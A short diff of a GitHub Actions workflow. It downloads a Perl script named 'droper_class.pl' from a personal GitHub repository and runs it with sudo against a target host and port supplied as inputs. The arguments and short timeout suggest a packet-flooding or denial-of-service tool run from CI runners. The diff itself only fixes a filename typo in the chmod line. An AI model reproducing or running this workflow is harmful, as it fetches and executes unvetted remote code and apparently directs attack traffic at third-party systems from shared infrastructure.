@@ -30,7 +30,7 @@ jobs:
           PORT="${{ inputs.port }}"
           
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/droper_class.pl -O Perll.pl
-          chmod +x Perl.pl || true
+          chmod +x Perll.pl || true
           
           sudo timeout 30 perl Perll.pl "$TARGET" "$PORT" 1400 30
 
